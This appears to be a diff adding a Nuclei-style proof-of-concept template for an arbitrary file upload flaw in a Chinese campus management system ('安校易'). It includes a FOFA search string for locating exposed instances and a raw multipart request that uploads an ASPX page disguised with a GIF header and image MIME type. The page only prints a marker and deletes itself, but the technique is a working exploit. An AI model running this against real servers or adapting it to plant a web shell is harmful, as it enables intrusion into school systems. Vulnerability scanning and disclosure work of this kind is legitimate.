@@ -1,0 +1,47 @@
+id: poc-qygoxhy1r95qsnar
+info:
+  name: 智慧校园(安校易)管理系统 FileUpTitle存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qygoxhy1r95qsnar'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qygoxhy1r95qsnar
+    fofa: title="智慧综合管理平台登入"
+http:
+- raw:
+  - 'POST /Module/FileUpPage/FileUpTitle.aspx?file_tmid=DudeSuite HTTP/1.1
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+    Connection: close
+
+
+    ------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="File"; filename="DudeSuite.aspx"
+
+    Content-Type: image/jpeg
+
+
+    GIF89a
+
+    <%@ Page Language="C#"%><% Response.Write("DudeSuite"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+
+    ------21909179191068471382830692394--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
